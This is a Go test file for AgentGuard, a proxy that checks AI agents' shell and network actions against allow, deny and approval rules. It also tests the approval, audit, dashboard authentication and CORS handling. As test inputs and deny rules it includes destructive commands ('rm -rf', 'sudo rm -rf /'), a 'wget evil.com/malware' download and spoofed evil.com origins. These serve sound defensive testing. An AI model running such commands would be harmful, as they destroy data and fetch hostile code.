package proxy

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Caua-ferraz/AgentGuard/pkg/audit"
	"github.com/Caua-ferraz/AgentGuard/pkg/notify"
	"github.com/Caua-ferraz/AgentGuard/pkg/policy"
)

// mustAdd is a test helper that calls ApprovalQueue.Add and fails on error.
func mustAdd(t *testing.T, q *ApprovalQueue, req policy.ActionRequest, result policy.CheckResult) *PendingAction {
	t.Helper()
	pa, err := q.Add(req, result)
	if err != nil {
		t.Fatalf("ApprovalQueue.Add: %v", err)
	}
	return pa
}

// newTestServer builds a Server using httptest (never calls ListenAndServe).
func newTestServer(t *testing.T, opts ...func(*Config)) *Server {
	t.Helper()

	dir := t.TempDir()
	logPath := filepath.Join(dir, "test_audit.jsonl")
	logger, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatalf("NewFileLogger: %v", err)
	}
	t.Cleanup(func() { logger.Close() })

	pol := &policy.Policy{
		Version: "1",
		Name:    "test-policy",
		Rules: []policy.RuleSet{
			{
				Scope: "shell",
				Allow: []policy.Rule{{Pattern: "ls *"}, {Pattern: "echo *"}},
				Deny:  []policy.Rule{{Pattern: "rm -rf *", Message: "Destructive command blocked"}},
				RequireApproval: []policy.Rule{{Pattern: "sudo *"}},
			},
			{
				Scope: "network",
				Allow: []policy.Rule{{Domain: "api.openai.com"}},
				Deny:  []policy.Rule{{Domain: "*.evil.com", Message: "Blocked domain"}},
			},
		},
	}

	cfg := Config{
		Port:             0,
		Engine:           policy.NewEngine(pol),
		Logger:           logger,
		DashboardEnabled: true,
		Notifier:         notify.NewDispatcher(policy.NotificationCfg{}),
		APIKey:           "test-secret",
		BaseURL:          "http://localhost:9999",
		Version:          "test",
	}

	for _, o := range opts {
		o(&cfg)
	}

	return NewServer(cfg)
}

// --- /v1/check ---

func TestHandleCheck_Allow(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"ls -la"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var result policy.CheckResult
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if result.Decision != policy.Allow {
		t.Errorf("expected ALLOW, got %s (reason: %s)", result.Decision, result.Reason)
	}

	// Verify timing headers are present
	if w.Header().Get("X-AgentGuard-Total-Ms") == "" {
		t.Error("missing X-AgentGuard-Total-Ms header")
	}
}

func TestHandleCheck_Deny(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"rm -rf /tmp/data"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected DENY, got %s", result.Decision)
	}
	if result.Reason != "Destructive command blocked" {
		t.Errorf("unexpected reason: %s", result.Reason)
	}
}

func TestHandleCheck_RequireApproval(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"sudo apt install vim"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.RequireApproval {
		t.Errorf("expected REQUIRE_APPROVAL, got %s", result.Decision)
	}
	if result.ApprovalID == "" {
		t.Error("expected approval_id to be set")
	}
	if !strings.HasPrefix(result.ApprovalID, "ap_") {
		t.Errorf("approval_id should start with ap_, got %s", result.ApprovalID)
	}
	if result.ApprovalURL == "" {
		t.Error("expected approval_url to be set")
	}
}

func TestHandleCheck_DefaultDeny(t *testing.T) {
	srv := newTestServer(t)

	body := `{"scope":"shell","command":"wget evil.com/malware"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected default DENY, got %s", result.Decision)
	}
}

func TestHandleCheck_NetworkScope(t *testing.T) {
	srv := newTestServer(t)

	// Allowed domain
	body := `{"scope":"network","domain":"api.openai.com"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	var result policy.CheckResult
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Allow {
		t.Errorf("expected ALLOW for openai, got %s", result.Decision)
	}

	// Denied domain
	body = `{"scope":"network","domain":"x.evil.com"}`
	req = httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w = httptest.NewRecorder()
	srv.handleCheck(w, req)

	result = policy.CheckResult{}
	_ = json.NewDecoder(w.Body).Decode(&result)
	if result.Decision != policy.Deny {
		t.Errorf("expected DENY for evil.com, got %s", result.Decision)
	}
}

func TestHandleCheck_MethodNotAllowed(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/check", nil)
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

func TestHandleCheck_InvalidJSON(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader("not json"))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400, got %d", w.Code)
	}
}

func TestHandleCheck_OversizedBody(t *testing.T) {
	srv := newTestServer(t)

	// Create a body larger than MaxRequestBodySize (1 MB)
	bigBody := strings.Repeat("x", MaxRequestBodySize+1)
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(bigBody))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for oversized body, got %d: %s", w.Code, w.Body.String())
	}
}

// --- /v1/approve and /v1/deny ---

func TestHandleApprove(t *testing.T) {
	srv := newTestServer(t)

	// Create a pending action first
	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	// Approve it
	req := httptest.NewRequest(http.MethodPost, "/v1/approve/"+pending.ID, nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "approved" {
		t.Errorf("expected approved, got %s", resp["status"])
	}

	// Verify it's resolved
	srv.approval.mu.RLock()
	pa := srv.approval.pending[pending.ID]
	srv.approval.mu.RUnlock()
	if !pa.Resolved {
		t.Error("pending action should be resolved")
	}
	if pa.Decision != "ALLOW" {
		t.Errorf("expected ALLOW decision, got %s", pa.Decision)
	}
}

func TestHandleDeny(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo rm -rf /"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/"+pending.ID, nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleDeny(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "denied" {
		t.Errorf("expected denied, got %s", resp["status"])
	}

	srv.approval.mu.RLock()
	pa := srv.approval.pending[pending.ID]
	srv.approval.mu.RUnlock()
	if pa.Decision != "DENY" {
		t.Errorf("expected DENY decision, got %s", pa.Decision)
	}
}

func TestHandleApprove_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/approve/ap_nonexistent", nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestHandleDeny_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/ap_nonexistent", nil)
	req.Header.Set("Authorization", "Bearer test-secret")
	w := httptest.NewRecorder()
	srv.handleDeny(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestHandleApprove_MethodNotAllowed(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/approve/ap_test", nil)
	w := httptest.NewRecorder()
	srv.handleApprove(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", w.Code)
	}
}

// --- /v1/status ---

func TestHandleStatus_Pending(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/"+pending.ID, nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "pending" {
		t.Errorf("expected pending, got %s", resp["status"])
	}
}

func TestHandleStatus_Resolved(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	_ = srv.approval.Resolve(pending.ID, policy.Allow)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/"+pending.ID, nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "resolved" {
		t.Errorf("expected resolved, got %s", resp["status"])
	}
	if resp["decision"] != "ALLOW" {
		t.Errorf("expected ALLOW, got %s", resp["decision"])
	}
}

func TestHandleStatus_NotFound(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/v1/status/ap_missing", nil)
	w := httptest.NewRecorder()
	srv.handleStatus(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

// --- /health ---

func TestHandleHealth(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	w := httptest.NewRecorder()
	srv.handleHealth(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp map[string]string
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp["status"] != "ok" {
		t.Errorf("expected ok, got %s", resp["status"])
	}
	if resp["version"] != "test" {
		t.Errorf("expected version=test, got %s", resp["version"])
	}
}

// --- /metrics ---

func TestHandleMetrics(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/metrics", nil)
	w := httptest.NewRecorder()
	srv.handleMetrics(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if !strings.Contains(w.Header().Get("Content-Type"), "text/plain") {
		t.Errorf("expected text/plain content type, got %s", w.Header().Get("Content-Type"))
	}
	body := w.Body.String()
	if !strings.Contains(body, "agentguard_") {
		t.Error("metrics response should contain agentguard_ prefixed metrics")
	}
}

// --- /v1/audit ---

func TestHandleAuditQuery(t *testing.T) {
	srv := newTestServer(t)

	// Generate some audit entries via checks
	checks := []string{
		`{"scope":"shell","command":"ls -la","agent_id":"bot-1"}`,
		`{"scope":"shell","command":"echo hello","agent_id":"bot-1"}`,
		`{"scope":"network","domain":"api.openai.com","agent_id":"bot-2"}`,
	}
	for _, body := range checks {
		r := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
		w := httptest.NewRecorder()
		srv.handleCheck(w, r)
	}

	// Query all
	req := httptest.NewRequest(http.MethodGet, "/v1/audit", nil)
	w := httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	var entries []audit.Entry
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 3 {
		t.Errorf("expected 3 audit entries, got %d", len(entries))
	}

	// Query by agent
	req = httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-1", nil)
	w = httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	entries = nil
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 2 {
		t.Errorf("expected 2 entries for bot-1, got %d", len(entries))
	}

	// Query by scope
	req = httptest.NewRequest(http.MethodGet, "/v1/audit?scope=network", nil)
	w = httptest.NewRecorder()
	srv.handleAuditQuery(w, req)

	entries = nil
	_ = json.NewDecoder(w.Body).Decode(&entries)
	if len(entries) != 1 {
		t.Errorf("expected 1 network entry, got %d", len(entries))
	}
}

// TestHandleAuditQuery_LimitAndOffset exercises the Phase 1.1 query-string
// contract on /v1/audit: ?limit is honored (default 100, ceiling
// MaxAuditQueryLimit, clamped silently above ceiling, 400 below 1 or
// non-numeric), ?offset skips matching records before results are collected.
func TestHandleAuditQuery_LimitAndOffset(t *testing.T) {
	srv := newTestServer(t)

	// Write 5 entries so limit/offset behavior is visible.
	for i := 0; i < 5; i++ {
		body := fmt.Sprintf(`{"scope":"shell","command":"cmd-%d","agent_id":"bot-lim"}`, i)
		r := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
		srv.handleCheck(httptest.NewRecorder(), r)
	}

	decode := func(t *testing.T, raw []byte) []audit.Entry {
		t.Helper()
		var out []audit.Entry
		if err := json.Unmarshal(raw, &out); err != nil {
			t.Fatalf("decode response %q: %v", string(raw), err)
		}
		return out
	}

	t.Run("no limit returns default", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-lim", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("code = %d, want 200", w.Code)
		}
		// We wrote 5, default limit is 100, so we get all 5 back.
		if got := len(decode(t, w.Body.Bytes())); got != 5 {
			t.Errorf("got %d entries, want 5", got)
		}
	})

	t.Run("explicit limit caps results", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-lim&limit=2", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("code = %d, want 200", w.Code)
		}
		if got := len(decode(t, w.Body.Bytes())); got != 2 {
			t.Errorf("got %d entries, want 2", got)
		}
	})

	t.Run("limit above ceiling is silently clamped", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?limit=999999", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("code = %d, want 200 (clamp, not reject): body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("limit below minimum is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?limit=0", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})

	t.Run("non-integer limit is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?limit=abc", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})

	t.Run("offset skips initial matches", func(t *testing.T) {
		// limit=2, offset=2 should return entries 3 and 4 (0-indexed: 2 and 3).
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=bot-lim&limit=2&offset=2", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		entries := decode(t, w.Body.Bytes())
		if len(entries) != 2 {
			t.Fatalf("got %d entries, want 2", len(entries))
		}
		if entries[0].Request.Command != "cmd-2" || entries[1].Request.Command != "cmd-3" {
			t.Errorf("offset=2 returned wrong records: [%s, %s]",
				entries[0].Request.Command, entries[1].Request.Command)
		}
	})

	t.Run("negative offset is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?offset=-1", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})

	t.Run("non-integer offset is rejected", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/v1/audit?offset=xyz", nil)
		w := httptest.NewRecorder()
		srv.handleAuditQuery(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("code = %d, want 400", w.Code)
		}
	})
}

// --- Dashboard ---

func TestHandleDashboard_UnauthenticatedServesLogin(t *testing.T) {
	srv := newTestServer(t) // APIKey set → login page expected

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "AgentGuard — Sign in") {
		t.Error("unauthenticated dashboard should serve the login page")
	}
	if strings.Contains(body, "test-secret") {
		t.Errorf("login page must not leak the API key anywhere in the HTML")
	}
}

func TestHandleDashboard_AuthenticatedServesDashboard(t *testing.T) {
	srv := newTestServer(t)

	sess, err := srv.sessions.Create()
	if err != nil {
		t.Fatalf("Create session: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	req.AddCookie(&http.Cookie{Name: SessionCookieName, Value: sess.Token})
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "AgentGuard Dashboard") {
		t.Error("authenticated dashboard must serve the dashboard page")
	}
	if strings.Contains(body, "test-secret") {
		t.Errorf("dashboard must never embed the API key in HTML")
	}
}

func TestHandleDashboard_NoAPIKey_ServesDashboardFreely(t *testing.T) {
	srv := newTestServer(t, func(c *Config) { c.APIKey = "" })

	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "AgentGuard Dashboard") {
		t.Error("with no API key configured, /dashboard should serve the dashboard directly")
	}
	if strings.Contains(body, `agentguard-api-key`) {
		t.Error("dashboard must never embed an api-key meta tag")
	}
}

func TestHandleDashboard_SecurityHeaders(t *testing.T) {
	srv := newTestServer(t)
	req := httptest.NewRequest(http.MethodGet, "/dashboard", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, req)

	for _, h := range []string{"X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy", "Cache-Control"} {
		if w.Header().Get(h) == "" {
			t.Errorf("missing security header %s", h)
		}
	}
}

func TestDashboardHTML_NoAPIKeyMetaTag(t *testing.T) {
	// Compile-time guarantee: the API key must never appear in the embedded
	// dashboard HTML, regardless of server configuration.
	if strings.Contains(dashboardHTML, "agentguard-api-key") {
		t.Fatal("dashboard HTML must not reference the old api-key meta tag")
	}
	if strings.Contains(dashboardHTML, "meta[name=\"agentguard-api-key\"]") {
		t.Fatal("dashboard HTML must not read an api-key meta tag")
	}
}

func TestHandleApprove_NoAuthHeader(t *testing.T) {
	srv := newTestServer(t) // has APIKey: "test-secret"

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	// No Authorization header, no cookie — must 401 through requireAuthOrSession.
	req := httptest.NewRequest(http.MethodPost, "/v1/approve/"+pending.ID, nil)
	w := httptest.NewRecorder()
	handler := requireAuthOrSession(srv.cfg.APIKey, srv.sessions, true, srv.handleApprove)
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 without auth, got %d", w.Code)
	}
}

func TestHandleDeny_NoAuthHeader(t *testing.T) {
	srv := newTestServer(t)

	pending := mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo halt"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req := httptest.NewRequest(http.MethodPost, "/v1/deny/"+pending.ID, nil)
	w := httptest.NewRecorder()
	handler := requireAuthOrSession(srv.cfg.APIKey, srv.sessions, true, srv.handleDeny)
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 without auth, got %d", w.Code)
	}
}

// --- /api/pending ---

func TestHandlePendingList(t *testing.T) {
	srv := newTestServer(t)

	// No pending actions
	req := httptest.NewRequest(http.MethodGet, "/api/pending", nil)
	w := httptest.NewRecorder()
	srv.handlePendingList(w, req)

	var list []*PendingAction
	_ = json.NewDecoder(w.Body).Decode(&list)
	if len(list) != 0 {
		t.Errorf("expected 0 pending, got %d", len(list))
	}

	// Add pending actions
	mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo reboot"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	mustAdd(t, srv.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo halt"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	req = httptest.NewRequest(http.MethodGet, "/api/pending", nil)
	w = httptest.NewRecorder()
	srv.handlePendingList(w, req)

	list = nil
	_ = json.NewDecoder(w.Body).Decode(&list)
	if len(list) != 2 {
		t.Errorf("expected 2 pending, got %d", len(list))
	}
}

// --- /api/stats ---

func TestHandleStats(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/api/stats", nil)
	w := httptest.NewRecorder()
	srv.handleStats(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var stats map[string]uint64
	_ = json.NewDecoder(w.Body).Decode(&stats)
	if _, ok := stats["total"]; !ok {
		t.Error("stats should contain 'total' key")
	}
	if _, ok := stats["allowed"]; !ok {
		t.Error("stats should contain 'allowed' key")
	}
	if _, ok := stats["denied"]; !ok {
		t.Error("stats should contain 'denied' key")
	}
}

// --- Auth middleware ---

func TestRequireAuthOrSession_ValidBearer(t *testing.T) {
	store := NewSessionStore()
	called := false
	handler := requireAuthOrSession("secret", store, true, func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "Bearer secret")
	w := httptest.NewRecorder()
	handler(w, req)

	if !called {
		t.Error("handler should have been called with valid bearer")
	}
	if w.Code != http.StatusOK {
		t.Errorf("expected 200, got %d", w.Code)
	}
}

func TestRequireAuthOrSession_InvalidBearer(t *testing.T) {
	store := NewSessionStore()
	called := false
	handler := requireAuthOrSession("secret", store, true, func(w http.ResponseWriter, r *http.Request) {
		called = true
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "Bearer wrong-key")
	w := httptest.NewRecorder()
	handler(w, req)

	if called {
		t.Error("handler should NOT be called with wrong bearer")
	}
	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestRequireAuthOrSession_NoAPIKey_AllowsAll(t *testing.T) {
	store := NewSessionStore()
	called := false
	handler := requireAuthOrSession("", store, true, func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	w := httptest.NewRecorder()
	handler(w, req)

	if !called {
		t.Error("handler should be called when no API key is configured")
	}
}

func TestRequireAuthOrSession_MalformedHeader(t *testing.T) {
	store := NewSessionStore()
	handler := requireAuthOrSession("secret", store, true, func(w http.ResponseWriter, r *http.Request) {
		t.Error("handler should NOT be called with malformed header")
	})

	// No "Bearer " prefix — treated as missing auth.
	req := httptest.NewRequest(http.MethodPost, "/test", nil)
	req.Header.Set("Authorization", "secret")
	w := httptest.NewRecorder()
	handler(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestNewServer_HasHTTPTimeouts(t *testing.T) {
	srv := newTestServer(t)

	if srv.http.ReadHeaderTimeout == 0 {
		t.Error("ReadHeaderTimeout should be set (Slowloris protection)")
	}
	if srv.http.ReadTimeout == 0 {
		t.Error("ReadTimeout should be set")
	}
	if srv.http.WriteTimeout == 0 {
		t.Error("WriteTimeout should be set")
	}
	if srv.http.IdleTimeout == 0 {
		t.Error("IdleTimeout should be set")
	}
}

// --- CORS middleware ---

// Backward compat (v0.4.1): empty AllowedOrigin means permissive-localhost —
// accept http://localhost:* and http://127.0.0.1:*, reject everything else.
// This mirrors pre-v0.4.0 behavior and is safe because the dashboard no
// longer embeds the API key and session cookies are SameSite=Strict.
func TestCORS_EmptyAllowedOrigin_PermissiveLocalhost(t *testing.T) {
	handler := withCORS("")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	cases := []struct {
		origin string
		want   bool
	}{
		{"http://localhost:3000", true},
		{"http://localhost:8080", true},
		{"http://127.0.0.1:9999", true},
		{"http://localhost", true},
		{"http://127.0.0.1", true},

		// External origins must still be rejected.
		{"https://evil.com", false},
		// Hostname-prefix attack: must NOT slip through.
		{"http://localhost.evil.com", false},
		{"http://127.0.0.1.evil.com", false},
		// No scheme/protocol-relative URL must not match.
		{"//localhost:3000", false},
	}

	for _, c := range cases {
		req := httptest.NewRequest(http.MethodGet, "/test", nil)
		req.Header.Set("Origin", c.origin)
		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)

		got := w.Header().Get("Access-Control-Allow-Origin")
		if c.want {
			if got != c.origin {
				t.Errorf("origin %q should be allowed, got ACAO=%q", c.origin, got)
			}
		} else {
			if got != "" {
				t.Errorf("origin %q should be rejected, got ACAO=%q", c.origin, got)
			}
		}
	}
}

func TestCORS_ExactOriginMatch(t *testing.T) {
	handler := withCORS("https://myapp.com")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("Origin", "https://myapp.com")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Header().Get("Access-Control-Allow-Origin") != "https://myapp.com" {
		t.Error("exact origin match should be allowed")
	}
	if w.Header().Get("Access-Control-Allow-Credentials") != "true" {
		t.Error("credentials mode must be enabled so session cookie is sent")
	}
	if !strings.Contains(w.Header().Get("Vary"), "Origin") {
		t.Error("Vary: Origin must be set to prevent cache poisoning")
	}
}

func TestCORS_OriginMismatch_Rejected(t *testing.T) {
	handler := withCORS("https://myapp.com")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	// Subtly different origin (trailing port) must NOT match.
	for _, origin := range []string{"https://myapp.com:8443", "http://myapp.com", "https://myapp.com.evil.com"} {
		req := httptest.NewRequest(http.MethodGet, "/test", nil)
		req.Header.Set("Origin", origin)
		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)

		if got := w.Header().Get("Access-Control-Allow-Origin"); got != "" {
			t.Errorf("origin %q must not match %q but got ACAO=%q", origin, "https://myapp.com", got)
		}
	}
}

func TestCORS_Preflight_StrictMode(t *testing.T) {
	handler := withCORS("https://app.example")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTeapot) // should not reach here
	}))

	req := httptest.NewRequest(http.MethodOptions, "/v1/check", nil)
	req.Header.Set("Origin", "https://app.example")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Errorf("preflight should short-circuit with 204, got %d", w.Code)
	}
}

// Preflight also short-circuits in permissive-localhost mode so browsers
// don't see the downstream 405/teapot.
func TestCORS_Preflight_PermissiveLocalhost(t *testing.T) {
	handler := withCORS("")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTeapot)
	}))

	req := httptest.NewRequest(http.MethodOptions, "/v1/check", nil)
	req.Header.Set("Origin", "http://localhost:3000")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Errorf("preflight should short-circuit with 204, got %d", w.Code)
	}
	if w.Header().Get("Access-Control-Allow-Origin") != "http://localhost:3000" {
		t.Error("permissive-localhost mode must reflect the localhost origin on preflight")
	}
}

// --- ApprovalQueue ---

func TestApprovalQueue_AddAndList(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	pa1 := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test1"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	pa2 := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test2"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	if !strings.HasPrefix(pa1.ID, "ap_") {
		t.Errorf("ID should start with ap_, got %s", pa1.ID)
	}
	if pa1.ID == pa2.ID {
		t.Error("IDs should be unique")
	}

	list := q.List()
